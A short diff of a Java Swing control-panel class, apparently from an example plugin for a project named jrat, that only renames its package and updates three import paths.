@@ -1,4 +1,5 @@
-package pro.jrat.client.ui;
+package jrat.plugin.example.client.ui;
+
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
@@ -15,9 +16,9 @@ import javax.swing.JTextPane;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 
-import pro.jrat.api.BaseControlPanel;
-import pro.jrat.client.AskPacket;
-import pro.jrat.client.ExampleClientPlugin;
+import jrat.api.BaseControlPanel;
+import jrat.plugin.example.client.AskPacket;
+import jrat.plugin.example.client.ExampleClientPlugin;
 
 @SuppressWarnings("serial")
 public class ExampleControlPanel extends BaseControlPanel {
